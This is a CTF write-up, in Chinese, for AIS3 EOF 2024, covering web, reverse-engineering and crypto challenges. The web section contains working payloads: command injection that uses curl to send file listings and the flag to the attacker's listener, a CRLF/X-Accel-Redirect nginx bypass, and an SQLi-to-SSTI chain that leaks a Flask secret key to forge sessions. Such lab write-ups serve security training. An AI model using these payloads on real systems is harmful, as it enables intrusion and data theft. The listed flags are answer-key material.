---
title: "AIS3 EOF 2024 Writeup"
date: 2024-01-08T00:00:00+08:00
draft: false
github_link: "https://github.com/Jimmy01240397/CTF-writeup/tree/master/ais3-eof-2024-writeup"
author: "Chumy"
tags:
  - CTF
image: /images/CTF.png
description: ""
toc: 
---

## Misc
### Welcome
#### 題目
![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/a74a45e2-8fbb-42d3-bcbc-0b8c488789c5)

#### Flag
![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/ac494f35-2f7e-4ccd-b244-5f049e7c83ea)

`AIS3{W3lc0mE_T0_A1S5s_EOF_2o24}`

## Web
### DNS Lookup Tool: Final
![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/f415e3ed-1266-43e2-88fb-a1e6681cee27)

#### Webpage
![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/41cfd043-3fe8-4141-81d3-f057901a04bc)

#### 解題
正常

![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/a81ed269-8b81-4b17-9c49-06cd95765705)

不存在 domain

![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/8c1547f0-025c-4875-aafd-3315a68e9d46)

使用違規字元

![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/2dbd2b38-8128-4883-95cd-aa7f50ee911f)


讀 code 找到 blacklist

![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/68686376-29a6-4bbc-bca0-3c63da797b1f)

發現 `$()` 沒檔，測一下

![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/525b06b2-d309-47a2-976d-70058bd30fb4)

過了

#### exploit
```python
#!/usr/bin/env python3

from flask import Flask,request,redirect,Response


app = Flask(__name__)

@app.route('/',methods=['GET', 'POST'])
def root():
    print(request.stream.read().decode())
    return "com"

@app.route('/<path:data>',methods=['GET'])
def run(data):
    print(data)
    return "com"

if __name__ == "__main__":
    app.run(host="::", port=80)
```

#### payload
```bash
curl http://10.105.0.21:21520/ -d 'name=example.$(curl 10.105.2.22 -d "$(ls /)")'

curl http://10.105.0.21:21520/ -d 'name=example.$(curl 10.105.2.22 -d "$(cat /flag_SWeUMks9hGYFciax)")'

curl http://10.105.0.21:21520/ -d 'name=example.$(curl 10.105.2.22 -d "$(cat /$(echo f)lag_SWeUMks9hGYFciax)")'
```

#### Flag
![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/481aad11-e682-4ccc-8333-a8f3f62d337e)

`AIS3{jUsT_3@$y_cOMmAnD_INJEc7ION}`

### Internal
![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/f5f445de-3668-4e00-b166-197c29c0f198)

#### 解題
![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/4f4b8f77-aeb2-4264-86d7-7371e96bd6e8)

看 code ，似乎是 url 帶 `redir` 參數會被 rediract 到後面的 url

![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/cec7b2f9-4786-4c07-b5b4-3c24602f507b)

![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/59104540-6328-463e-a368-52dab72ef472)

path 用 `/flag` 會被 nginx 擋，所以可能要繞過 nginx 取得後端的 `/flag` api

![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/8c81a610-7658-40f6-9514-174c9139ecfe)

仔細看，這邊似乎有 CRLF 的問題（regex 遇到換行會無效，只檢查到換行前）

![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/58448297-53f1-4488-8e9c-1b21be1f22f7)

所以我們可以任意更改 response 的 header 或 content。

![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/8b4b39fd-e7a3-4bc2-9fa8-730c299e3086)

![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/85ee4998-a99b-4813-9154-df2fd940fa03)

參考這個 [nginx doc internal](https://nginx.org/en/docs/http/ngx_http_core_module.html#internal)，我們可以增加 `X-Accel-Redirect` header 讓 nginx 收到這個 response 時從 nginx 改成回傳 `/flag` api 的內容。

#### exploit
```bash
curl -vvv "$1?redir=$(urlencode "https://google.com
X-Accel-Redirect: /flag")"
```

#### Flag
![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/bdc8499e-b765-4b59-9e68-f5462358f2a8)

`AIS3{jU$T_sOM3_funNy_N91Nx_FEatur3}`

### copypasta
![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/4f6a587e-65c5-4e5c-b98f-39a21297138e)

#### 解題
一個複製文產生器

![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/139b1d1d-0ed3-4e37-9bf4-9c07b78e4aa9)

他會保存所有人在這個網頁生成的文章，裡面有一個文章含有 flag，我們要把牠撈出來。

但是兩個問題
1. 沒有該文章的 ID
2. 如果 session 裡面沒有該文章的 ID 他會 permission denied

![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/c2c6746f-9e88-423f-a357-89e8b23ad2ee)

發現這邊有 `SQLi` 的漏洞

![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/e65933f5-7d76-4ba1-9db6-186afdc4fd24)

這邊還有 `SSTI` 的漏洞

![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/a61b6ac4-0832-4066-be55-877c9acf7630)

因此思路會是：
1. 用 SQLi 生成一個帶有 SSTI payload 的模板並生成文章
2. 利用這個文章的 SSTI 把 session 的 `secret_key` leak 出來
3. 用 SQLi 生成一個模板，裡面有 flag page id 的資料
4. 用 leak 出來 的 `secret_key` 修改 session
5. 讀取 flag page

於是構建出 SSTI payload `field.__init__.__globals__[http]._dt_as_utc.__globals__[sys].modules[flask].current_app.secret_key`

然後搭配 SQLi 得到這個 payload ` union SELECT 0 as id, 'ans' as title, '{field.__init__.__globals__[http]._dt_as_utc.__globals__[sys].modules[flask].current_app.secret_key}' as template`

還有 dump flag page id 的 SQLi payload ` union SELECT id, id as title, id as template from copypasta where orig_id=3`

#### exploit
```python
import requests
import sys
import urllib.parse
import hashlib
from bs4 import BeautifulSoup
from flask.json.tag import TaggedJSONSerializer
from itsdangerous import *

session = requests.session()

sqli = " union SELECT 0 as id, 'ans' as title, '{field.__init__.__globals__[http]._dt_as_utc.__globals__[sys].modules[flask].current_app.secret_key}' as template"

session.get(f'{sys.argv[1]}')
data = session.post(f'{sys.argv[1]}/use?id=0{urllib.parse.quote(sqli, safe="")}', params={'a': 'a'}).text

secret_key = BeautifulSoup(data, "html.parser").article.get_text()
print(f'secret_key: {secret_key}')

sqli = " union SELECT id, id as title, id as template from copypasta where orig_id=3"
data = session.get(f'{sys.argv[1]}/use?id=0{urllib.parse.quote(sqli, safe="")}').text

flagid = BeautifulSoup(data, "html.parser").pre.get_text()
print(f'flagid: {flagid}')

for a in session.cookies:
    if a.name == 'session':
        nowsession = a
        break

serializer = URLSafeTimedSerializer(secret_key=secret_key,
                  salt='cookie-session',
                  serializer=TaggedJSONSerializer(),
                  signer_kwargs={
                      'key_derivation': 'hmac',
                      'digest_method': hashlib.sha1,
                  })

sessiondata = serializer.loads(nowsession.value)
sessiondata['posts'].append(flagid)
session.cookies.set(nowsession.name, serializer.dumps(sessiondata), domain=nowsession.domain, path=nowsession.path)

print(session.get(f'{sys.argv[1]}/view/{flagid}').text)
```

#### Flag
![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/a4b2e738-1171-4938-abc6-14c7857e024a)

`AIS3{I_l0Ve_P@$tA_@ND_cOpypasta}`

## Reverse

### Flag Generator
![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/3be03d23-4734-4307-b379-b51690a44d1b)

#### 解題
一個 windows 執行檔

![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/fdfa9179-addf-465f-b358-407aa4e23c28)

執行以後他會生成另一個 `flag.exe` 執行檔，但是不知道為甚麼生成的檔案是空的。

![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/b2311bde-983d-4ad6-a2ec-5112cc766946)

IDA 打開來看到他會執行 `writeFile` function 來寫 `flag.exe` 檔案

![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/4917b70a-c2d3-41ce-94be-3bf3ab333118)

但是這個 `writeFile` 裡面沒有寫寫檔的程式，只有印一串字串到 stdout。

![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/a69d73b7-91b7-41d5-8dba-694a577d6807)

![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/76eb0156-8f7e-4b83-9e2e-fe9713fb4f61)

所以需要 patch 一下，把一些不需要的拿掉，然後把 `fwrite` 改成對這個檔案作用，而不是 `stdout`

![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/a1565aae-96d6-4ca3-9fe7-fa67a538764e)

![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/aae51b36-d1e1-4e62-9c73-acda4d7f4f49)

![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/16695a9f-44e0-4359-8d88-f5db9bfac5d0)

成功生成 `flag.exe` 以後執行就拿到 flag 了

![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/66292f23-80bf-489c-b735-8c9b7d149017)


#### Flag
![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/0ef9cb8c-9212-4a25-8a5f-e2e74ed83127)

`AIS3{Us1n9_WINd0w5_I$_suCh_@_p@1N....}`

### Stateful
![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/6e785309-6170-49fc-9714-773494905188)

#### 解題
他是一個 linux ELF 執行檔

![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/3cbe0887-c8f5-4deb-81cd-a9db1934a7d2)

執行後直接噴 `WRONG!!!`

![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/45672138-30f9-4aa2-9fdb-1bfc8458ad8d)

似乎執行時要輸入一個長度為 43 的字串參數，應該是 flag，這個字串會經過 `state_machine` function 運算後跟 `k_target` 裡的資料一個一個做比對。

![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/ba46bbd0-0178-4bb9-9ada-cd8c3a15d4ea)

![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/fe1e25b7-1250-4702-8e97-b66f05fa000d)

![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/fe6d21e3-06f3-4066-a609-ff1ab19b485e)

把 `k_target` 複製出來

![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/0f29e032-b311-41a9-844f-fea2b7f80b72)

![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/99d07b7c-a60d-4e3e-943a-8d80877ec0de)

`state_machine` 裡面會有一坨判斷並且會按照某個特定順序執行裡面的這些 function，設定中斷點做 debug 逐步執行，並且記錄這些 function 的執行過程

![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/3e1242d3-c80f-4e09-85b1-760079fdc09e)

![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/85b6eea0-8d58-460a-804a-502a843ce8f1)

得到：

```
state_3618225054
state_2057902921
state_671274660
state_2357240312
state_1438496410
state_2263885268
state_4260333374
state_3995931083
state_3844354947
state_2421543205
state_416430256
state_2373489361
state_2202680315
state_4026467378
state_1765279360
state_2131447726
state_1132589236
state_3443361864
state_2098792827
state_4237907356
state_269727185
state_1780152111
state_4046605750
state_3544494813
state_4008735947
state_2309210106
state_3908914479
state_2095151013
state_2816834243
state_4165665722
state_3656605789
state_1154341356
state_809393455
state_1093244921
state_1595228866
state_2316743832
state_2907124712
state_3507844042
state_3907553856
state_1929982570
state_4130555047
state_794507810
state_1843624184
state_3901233957
state_126130845
state_71198295
state_557589375
state_3420754995
state_3648003850
state_1978986903
```
![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/4d3b76db-9a4d-478d-9864-adf0d9bd9449)

這些 function 的內部都是一個加減法運算，所以我們按照這個順序反過來把 `k_target` 推回去就會拿到 flag 了

![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/404e0876-0838-4e42-aa21-6c555933b623)


#### exploit
```python
data = bytearray(b'\x9E\x26\xEC\x33\xE6\x03\xF4\x3A\x6B\x62\x85\x75\x5F\xC4\xD1\x81\x3B\xEC\xF8\xB0\xFA\x34\x4C\xF2\x58\x72\x5F\x0D\x54\x34\x7B\x22\xCD\x33\x53\x53\xC3\xFA\x54\x80\x33\xCC\x7D')
data = [int(a) for a in data]

data[5] -= data[37] + data[20]
data[8] -= data[14] + data[16]
data[17] -= data[38] + data[24]
data[15] -= data[40] + data[8]
data[37] -= data[12] + data[16]
data[4] -= data[6] + data[22]
data[10] += data[12] + data[22]
data[18] -= data[26] + data[31]
data[23] -= data[30] + data[39]
data[4] -= data[27] + data[25]
data[37] -= data[27] + data[18]
data[41] += data[3] + data[34]
data[13] -= data[26] + data[8]
data[2] -= data[34] + data[25]
data[0] -= data[28] + data[31]
data[4] -= data[7] + data[25]
data[18] -= data[29] + data[15]
data[21] += data[13] + data[42]
data[21] -= data[34] + data[15]
data[7] -= data[10] + data[0]
data[13] -= data[25] + data[28]
data[32] -= data[5] + data[25]
data[31] -= data[1] + data[16]
data[1] -= data[16] + data[40]
data[30] += data[13] + data[2]
data[1] -= data[15] + data[6]
data[7] -= data[21] + data[0]
data[24] -= data[20] + data[5]
data[36] -= data[11] + data[15]
data[0] -= data[33] + data[16]
data[19] -= data[10] + data[16]
data[1] += data[29] + data[13]
data[30] += data[33] + data[8]
data[15] -= data[22] + data[10]
data[20] -= data[19] + data[24]
data[27] -= data[18] + data[20]
data[39] += data[25] + data[38]
data[23] -= data[7] + data[34]
data[37] += data[29] + data[3]
data[5] -= data[40] + data[4]
data[17] -= data[0] + data[7]
data[9] -= data[11] + data[3]
data[31] -= data[34] + data[16]
data[16] -= data[25] + data[11]
data[14] += data[32] + data[6]
data[6] -= data[10] + data[41]
data[2] -= data[11] + data[8]
data[0] += data[18] + data[31]
data[9] += data[2] + data[22]
data[14] -= data[35] + data[8]

data = [(a + 512) % 256 for a in data]

print(data)

print(bytes(data))
```

#### Flag
![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/211f3bd9-4c93-4797-a693-09fd643b71f4)

`AIS3{arE_Y0u_@_sTATEfuL_Or_ST4t3L3SS_CTF3R}`

### PixelClicker
![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/0728f691-eff5-4ab0-bf26-40d4f319bf19)

(本題是賽後解的)

#### 解題
一個充滿了點點的正方形的 windows from，這接點點（pixel）可以點擊

![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/70b2aa04-a4ef-4707-b492-3310618aab71)

IDA 打開來看翻一翻，翻到 `sub_7FF7059813B0` function 應該是處理點擊 pixel 的 function

最下面的 switch 是處理計數的，點擊次數是存在 `dword_7FF705985708` 這個 global var 裡

![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/72ef7d61-735f-4649-9ca6-dd9e3da2cf97)

上面的 if 是判斷遊戲成功或失敗以及結束的區段。

![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/4913f88e-2945-467c-9551-db008456d441)

可以發現她會叫你點 600 次以上才結束

![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/cebb170d-f9e5-4d24-9c0e-16dc496086d8)

最後通靈一下應該要把 Block 挖出來存起來看看。

![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/8a2b2ffe-f6c7-4280-a7e2-b064a5a31978)

因為 600 次太久了，所以把他 patch 成點 1 次就好

![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/8a2f7627-1cb1-4f23-ad2f-32cc5bba516f)

![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/c118eb07-af8f-43a5-a301-408297ae95b8)

![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/1923ca83-0adb-4a3c-813c-b9014645ac59)

中斷點設置在執行完 Block 以後

![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/176512aa-3f28-4a07-8d75-f4102b91f56e)

找到 Block 的位置後，把她的資料在 Hex view 全部選取

![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/6b4260c2-15a7-4c4a-af95-7ca64b8ff9ca)

![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/7707d000-ab8a-49d5-b674-e6c9ac516952)

![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/1296e037-2f79-47c1-b3cc-65e3537b379c)

右鍵 save file

![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/eb7411d6-450e-4917-a7ec-a131264fd044)

然後開 cmd 用 file 看一下發現他長度有 1440054 bytes

![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/73d6157e-ce99-45f2-b95e-5702cce3484f)

剛剛選取的不夠的話在重新做一次選取 1440054 bytes 然後 save file

最後用圖片的方式開，可以看到這張圖片

#### Flag

![data](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/82b2e164-ad8f-41ec-a2a5-f6f7188b1c65)

`AIS3{jUSt_4_5imPLE_clICkEr_g@m3}`

## Crypto
### Baby RSA
![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/7045274e-382a-4447-bd6b-0890103f4304)

#### 解題

進去會給你 N 跟 e 還有用這個 N 跟 e RSA 加密後的 flag 密文

![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/ca214c9e-1f44-4961-aa37-7eb8501ecad2)

每次進去的 N 都不一樣，但是 e 都會是 3

![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/d3faef7b-6c5d-407a-aa03-c9ff9642b70d)

可以用 [Coppersmith Basic Broadcast Attack](https://ctf-wiki.org/crypto/asymmetric/rsa/rsa_coppersmith_attack/)，先收集一定數量的 N 跟 flag 密文，然後用 Broadcast Attack 破解密文就會拿到 flag

#### exploit
```python
import sys
from pwn import *

from Crypto.Util.number import bytes_to_long, long_to_bytes
import json
import gmpy2
from functools import reduce

def modinv(a, m):
    return int(gmpy2.invert(a, m))

def chinese_remainder(n, a):
    sum = 0
    prod = reduce(lambda a, b: a * b, n)
    for n_i, a_i in zip(n, a):
        p = prod // n_i
        sum += a_i * modinv(p, n_i) * p
    return int(sum % prod)

if len(sys.argv) > 3:
    target = sys.argv[1]
    port = int(sys.argv[2])
    N = []
    c = []
    for a in range(int(sys.argv[3])):
        r = remote(target, port)
        key = r.recvline().strip().decode()
        N.append(str(key.split(',')[0].split('=')[1]))
        c.append(str(r.recvline().strip().decode().split(':')[1].strip()))
        r.close()
    with open(sys.argv[4], 'w') as f:
        f.write(json.dumps({'N': N, 'c': c}))
else:
    with open(sys.argv[1], 'r') as f:
        data = json.loads(f.read())
    m = chinese_remainder([int(a) for a in data['N']], [int(a) for a in data['c']])
    m, state = gmpy2.iroot(m, 3)
    print(hex(int(m)))
    print(long_to_bytes(m))
```
```bash
python3 exp.py chal1.eof.ais3.org 10002 20 data.json
python3 exp.py data.json
```


#### Flag
![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/af4527d1-9682-4ca5-9fd6-9db19a2ba2b3)

`AIS3{c0pPerSMItH$_5hOr7_p@D_a7t4Ck}`

